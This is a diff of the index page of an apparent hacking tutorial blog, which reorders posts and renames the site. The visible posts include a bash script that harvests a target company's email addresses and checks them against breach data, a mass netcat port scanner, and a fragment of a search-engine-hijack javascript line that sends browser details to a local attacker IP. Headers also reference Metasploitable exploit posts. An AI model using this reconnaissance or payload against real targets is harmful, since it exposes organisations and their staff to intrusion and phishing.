@@ -5,171 +5,20 @@
 <link rel="stylesheet" href="main.css" type="text/css" />
 <link rel="stylesheet" href="blog.css" type="text/css" />
 <link rel="alternate" type="application/rss+xml" title="Subscribe to this page..." href="feed.rss" />
-<title>343</title>
+<title>metalkey</title>
 </head><body>
 <div id="divbodyholder">
 <div class="headerholder"><div class="header">
 <div id="title">
-<h1 class="nomargin"><a class="ablack" href="https://metalkey.github.io/index.html">343</a></h1>
+<h1 class="nomargin"><a class="ablack" href="https://metalkey.github.io/index.html">metalkey</a></h1>
 <div id="description">Hacking tutorials + info</div>
 </div></div></div>
 <div id="divbody"><div class="content">
-<h3><a class="ablack" href="company-email-enumeration--breached-email-finder.html">
-Company Email Enumeration + Breached Email Finder
-</a></h3>
-<!-- bashblog_timestamp: #201610242334.08# -->
-<div class="subtitle">October 24, 2016 &mdash; 
-metalkey
-</div>
-<!-- text begin -->
-
-Enumerating email addresses for a target domain and checking if these emails appear in known breaches can be extremely useful when performing recon.<br>
-This script will use <b><a href="https://hunter.io">hunter.io</a></b> to enumerate domain emails and feed them into <b><a href="https://hacked-emails.com">hacked-emails.com</a></b> to check if they appear in known breaches.<br>
-<br>
-<b>Note:</b> Substitute <b>YOURAPIKEY</b> with your hunter.io API key. This can be obtained by creating a hunter.io account.<br>
-<br>
-<code>
-	<div class="code">
-root@kali:~#	<com>cat emails.sh</com><br>
-		#!/bin/bash<br>
-		rm found-emails.txt<br>
-		rm hacked-emails.txt<br>
-		clear<br>
-		echo -e "\e[92mEnter Target Domain:"<br>
-		echo -e "\e[39m"<br>
-		read hname<br>
-		clear<br>
-		echo -e "[+] Email Recon Started"<br>
-		echo -e "\e[39m"<br>
-		<br>
-		# Email Checks<br>
-		echo "- Enumerating Domain Emails"<br>
-		curl -k -s "https://api.emailhunter.co/v1/search?domain=$hname&api_key=<b>YOURAPIKEY</b>" | grep -Po '"value" :.*?[^\\]",' | cut -d'"' -f4 > found-emails.txt<br>
-		echo "Found the following emails:"<br>
-		cat found-emails.txt<br>
-		echo ""<br>
-		echo "[+] Checking if Emails have been breached"<br>
-		for email in $(cat found-emails.txt);do<br>
-		curl -k -s "https://hacked-emails.com/api?q=$email" | grep '"status":"found"' | cut -d'"' -f8 >> hacked-emails.txt &<br>
-		done<br>
-		wait<br>
-		echo "The following email addresses appear in known breaches:"<br>
-		cat hacked-emails.txt<br>
-		<br>
-		echo -e "\e[39m"<br>
-		echo -e "[*] Please wait..."<br>
-		wait<br>
-		echo -e "[END] Email Recon Complete!"<br>
-		echo -e ""<br>
-
-	</div>
-</code>
-
-<p>Tags: <a href='tag_recon.html'>recon</a></p>
-
-<!-- text end -->
-<h3><a class="ablack" href="installing-wickr-on-ubuntu-1604.html">
-Installing Wickr on Ubuntu 16.04
-</a></h3>
-<!-- bashblog_timestamp: #201610221813.57# -->
-<div class="subtitle">October 22, 2016 &mdash; 
-metalkey
-</div>
-<!-- text begin -->
-
-<div align="center">
-<img src="wickr.png" />
-</div>
-<br>
-<h2>Download Wickr and Dependencies</h2>
-<code>
-<div class="code">
-	user@ubuntu~$ <com>wget https://dls.wickr.com/Downloads/wickr-me_2.6.0_amd64.deb<br></com>
-	user@ubuntu~$ <com>wget http://security.ubuntu.com/ubuntu/pool/universe/liba/libav/libavutil52_9.18-0ubuntu0.14.04.1_amd64.deb<br></com>
-	user@ubuntu~$ <com>wget http://mirrors.kernel.org/ubuntu/pool/main/i/icu/libicu52_52.1-8ubuntu0.2_amd64.deb<br></com>
-	user@ubuntu~$ <com>wget http://mirrors.kernel.org/ubuntu/pool/universe/x/x264/libx264-142_0.142.2389+git956c8d8-2_amd64.deb<br></com>
-</div>
-</code>
-
-<h2>Install Dependencies and Wickr</h2>
-<code>
-<div class="code">
-	user@ubuntu~$ <com>sudo dpkg -i libavutil52_9.18-0ubuntu0.14.04.1_amd64.deb<br></com>
-	user@ubuntu~$ <com>sudo dpkg -i libicu52_52.1-8ubuntu0.2_amd64.deb<br></com>
-	user@ubuntu~$ <com>sudo dpkg -i libx264-142_0.142.2389+git956c8d8-2_amd64.deb<br></com>
-	user@ubuntu~$ <com>sudo dpkg -i wickr-me_2.6.0_amd64.deb<br></com>
-	user@ubuntu~$ <com>wickr-me<br></com>
-</div>
-</code>
-
-<p>Tags: <a href='tag_privacy.html'>privacy</a></p>
-
-<!-- text end -->
-<h3><a class="ablack" href="port-scanning-with-netcat-up-to-1000pps.html">
-Port Scanning With Netcat (Up to 1000 ports/second)
-</a></h3>
-<!-- bashblog_timestamp: #201610081947.58# -->
-<div class="subtitle">October 08, 2016 &mdash; 
-metalkey
-</div>
-<!-- text begin -->
-
-<p>
-<code>
-    <div class="code">
-        <com>nano catscan.sh</com><br>
-        #!/bin/bash<br>
-        mkdir catscan-results<br>
-        cp targets.txt catscan-results<br>
-        cd catscan-results<br>
-        <br>
-        # Use ping to get IP addresses. Strip bash colours from output with sed<br>
-        echo "Generating IP list..."<br>
-        for host in $(cat targets.txt);do<br>
-            hostip=`ping -c 1 -W 1 $host  | grep PING | cut -d"(" -f2 | cut -d")" -f1 | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"`<br>
-                echo "$host resolves to $hostip" <br>
-                    echo "$host resolves to $hostip" >> host-ip.txt <br>
-                        echo $hostip >> temp-hosts.txt<br>
-                        done<br>
-                        wait<br>
-                        <br>
-                        # Sort ips and remove dupes<br>
-                        sort -u temp-hosts.txt > hosts.txt<br>
-                        rm temp-hosts.txt<br>
-                        <br>
-                        echo "Starting scan..."<br>
-                        # Scan y ports at a time and ouput to results.txt<br>
-                        # To change number of ports scanned at a time, change y, x incrementer, y incrementer<br>
-                        for ip in $(cat hosts.txt);do<br>
-                            x=0<br>
-                                y=1000<br>
-                                    while [ $y -le 66000 ];do<br>
-                                            echo "Scanning $ip (Ports $x - $y)"<br>
-                                                    for num in $(seq $x $y);do<br>
-                                                                netcat -vzn -w 1 $ip $num >> results.txt 2>&1 &<br>
-                                                                        done<br>
-                                                                                wait<br>
-                                                                                        x=$(( $x + 1000 ))<br>
-                                                                                                y=$(( $x + 1000 ))<br>
-                                                                                                        grep $ip results.txt | grep " open" results.txt | sort -u<br>
-                                                                                                            done<br>
-                                                                                                            done<br>
-                                                                                                            grep $ip results.txt | grep " open" results.txt | sort -u > open-ports.txt<br>
-    </div><br>
-</code>
-</p>
-
-<p>Tags: <a href='tag_port-scanning.html'>port-scanning</a></p>
-
-
-<!-- text end -->
 <h3><a class="ablack" href="google-chrome-search-poison---default-search-engine-exploit.html">
 Google Chrome Search Poison – Default Search Engine Exploit
 </a></h3>
-<!-- bashblog_timestamp: #201607022037.36# -->
-<div class="subtitle">July 02, 2016 &mdash; 
-metalkey
-</div>
+<!-- bashblog_timestamp: #201708271420.15# -->
+<div class="subtitle">August 27, 2017</div>
 <!-- text begin -->
 
 <h2>Introduction</h2>
@@ -241,6 +90,167 @@ javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.produ
 <p></code></p>
 
 <p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>
+
+
+
+
+
+<!-- text end -->
+<h3><a class="ablack" href="company-email-enumeration--breached-email-finder.html">
+Company Email Enumeration + Breached Email Finder
+</a></h3>
+<!-- bashblog_timestamp: #201610242334.08# -->
+<div class="subtitle">October 24, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+
+Enumerating email addresses for a target domain and checking if these emails appear in known breaches can be extremely useful when performing recon.<br>
+This script will use <b><a href="https://hunter.io">hunter.io</a></b> to enumerate domain emails and feed them into <b><a href="https://hacked-emails.com">hacked-emails.com</a></b> to check if they appear in known breaches.<br>
+<br>
+<b>Note:</b> Substitute <b>YOURAPIKEY</b> with your hunter.io API key. This can be obtained by creating a hunter.io account.<br>
+<br>
+<code>
+	<div class="code">
+root@kali:~#	<com>cat emails.sh</com><br>
+		#!/bin/bash<br>
+		rm found-emails.txt<br>
+		rm hacked-emails.txt<br>
+		clear<br>
+		echo -e "\e[92mEnter Target Domain:"<br>
+		echo -e "\e[39m"<br>
+		read hname<br>
+		clear<br>
+		echo -e "[+] Email Recon Started"<br>
+		echo -e "\e[39m"<br>
+		<br>
+		# Email Checks<br>
+		echo "- Enumerating Domain Emails"<br>
+		curl -k -s "https://api.emailhunter.co/v1/search?domain=$hname&api_key=<b>YOURAPIKEY</b>" | grep -Po '"value" :.*?[^\\]",' | cut -d'"' -f4 > found-emails.txt<br>
+		echo "Found the following emails:"<br>
+		cat found-emails.txt<br>
+		echo ""<br>
+		echo "[+] Checking if Emails have been breached"<br>
+		for email in $(cat found-emails.txt);do<br>
+		curl -k -s "https://hacked-emails.com/api?q=$email" | grep '"status":"found"' | cut -d'"' -f8 >> hacked-emails.txt &<br>
+		done<br>
+		wait<br>
+		echo "The following email addresses appear in known breaches:"<br>
+		cat hacked-emails.txt<br>
+		<br>
+		echo -e "\e[39m"<br>
+		echo -e "[*] Please wait..."<br>
+		wait<br>
+		echo -e "[END] Email Recon Complete!"<br>
+		echo -e ""<br>
+
+	</div>
+</code>
+
+<p>Tags: <a href='tag_recon.html'>recon</a></p>
+
+
+
+
+<!-- text end -->
+<h3><a class="ablack" href="installing-wickr-on-ubuntu-1604.html">
+Installing Wickr on Ubuntu 16.04
+</a></h3>
+<!-- bashblog_timestamp: #201610221813.57# -->
+<div class="subtitle">October 22, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+
+<div align="center">
+<img src="wickr.png" />
+</div>
+<br>
+<h2>Download Wickr and Dependencies</h2>
+<code>
+<div class="code">
+	user@ubuntu~$ <com>wget https://dls.wickr.com/Downloads/wickr-me_2.6.0_amd64.deb<br></com>
+	user@ubuntu~$ <com>wget http://security.ubuntu.com/ubuntu/pool/universe/liba/libav/libavutil52_9.18-0ubuntu0.14.04.1_amd64.deb<br></com>
+	user@ubuntu~$ <com>wget http://mirrors.kernel.org/ubuntu/pool/main/i/icu/libicu52_52.1-8ubuntu0.2_amd64.deb<br></com>
+	user@ubuntu~$ <com>wget http://mirrors.kernel.org/ubuntu/pool/universe/x/x264/libx264-142_0.142.2389+git956c8d8-2_amd64.deb<br></com>
+</div>
+</code>
+
+<h2>Install Dependencies and Wickr</h2>
+<code>
+<div class="code">
+	user@ubuntu~$ <com>sudo dpkg -i libavutil52_9.18-0ubuntu0.14.04.1_amd64.deb<br></com>
+	user@ubuntu~$ <com>sudo dpkg -i libicu52_52.1-8ubuntu0.2_amd64.deb<br></com>
+	user@ubuntu~$ <com>sudo dpkg -i libx264-142_0.142.2389+git956c8d8-2_amd64.deb<br></com>
+	user@ubuntu~$ <com>sudo dpkg -i wickr-me_2.6.0_amd64.deb<br></com>
+	user@ubuntu~$ <com>wickr-me<br></com>
+</div>
+</code>
+
+<p>Tags: <a href='tag_privacy.html'>privacy</a></p>
+
+
+
+
+<!-- text end -->
+<h3><a class="ablack" href="port-scanning-with-netcat-up-to-1000pps.html">
+Port Scanning With Netcat (Up to 1000 ports/second)
+</a></h3>
+<!-- bashblog_timestamp: #201610081947.58# -->
+<div class="subtitle">October 08, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+
+<p>
+<code>
+    <div class="code">
+        <com>nano catscan.sh</com><br>
+        #!/bin/bash<br>
+        mkdir catscan-results<br>
+        cp targets.txt catscan-results<br>
+        cd catscan-results<br>
+        <br>
+        # Use ping to get IP addresses. Strip bash colours from output with sed<br>
+        echo "Generating IP list..."<br>
+        for host in $(cat targets.txt);do<br>
+            hostip=`ping -c 1 -W 1 $host  | grep PING | cut -d"(" -f2 | cut -d")" -f1 | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g"`<br>
+                echo "$host resolves to $hostip" <br>
+                    echo "$host resolves to $hostip" >> host-ip.txt <br>
+                        echo $hostip >> temp-hosts.txt<br>
+                        done<br>
+                        wait<br>
+                        <br>
+                        # Sort ips and remove dupes<br>
+                        sort -u temp-hosts.txt > hosts.txt<br>
+                        rm temp-hosts.txt<br>
+                        <br>
+                        echo "Starting scan..."<br>
+                        # Scan y ports at a time and ouput to results.txt<br>
+                        # To change number of ports scanned at a time, change y, x incrementer, y incrementer<br>
+                        for ip in $(cat hosts.txt);do<br>
+                            x=0<br>
+                                y=1000<br>
+                                    while [ $y -le 66000 ];do<br>
+                                            echo "Scanning $ip (Ports $x - $y)"<br>
+                                                    for num in $(seq $x $y);do<br>
+                                                                netcat -vzn -w 1 $ip $num >> results.txt 2>&1 &<br>
+                                                                        done<br>
+                                                                                wait<br>
+                                                                                        x=$(( $x + 1000 ))<br>
+                                                                                                y=$(( $x + 1000 ))<br>
+                                                                                                        grep $ip results.txt | grep " open" results.txt | sort -u<br>
+                                                                                                            done<br>
+                                                                                                            done<br>
+                                                                                                            grep $ip results.txt | grep " open" results.txt | sort -u > open-ports.txt<br>
+    </div><br>
+</code>
+</p>
+
+<p>Tags: <a href='tag_port-scanning.html'>port-scanning</a></p>
+
+
+
 
 
 <!-- text end -->
@@ -319,6 +329,9 @@ root@metasploitable:/etc/unreal#
 
 
 
+
+
+
 <!-- text end -->
 <h3><a class="ablack" href="vsftpd-v234-backdoor-command-execution.html">
 VSFTPD v2.3.4 Backdoor Command Execution
@@ -366,6 +379,9 @@ root@metasploitable:/#
 <p></code></p>
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+
+
+
 
 
 
@@ -466,6 +482,9 @@ root
 <p></code></p>
 
 <p>Tags: <a href='tag_privilege-escalation.html'>privilege-escalation</a></p>
+
+
+
 
 
 
@@ -607,6 +626,9 @@ Additional attack vectors include:<br>
 If your system is vulnerable, ensure it is patched immediately by upgrading your version of Bash then re-testing.</p>
 
 <p>Tags: <a href='tag_shellshock.html'>shellshock</a></p>
+
+
+
 
 
 
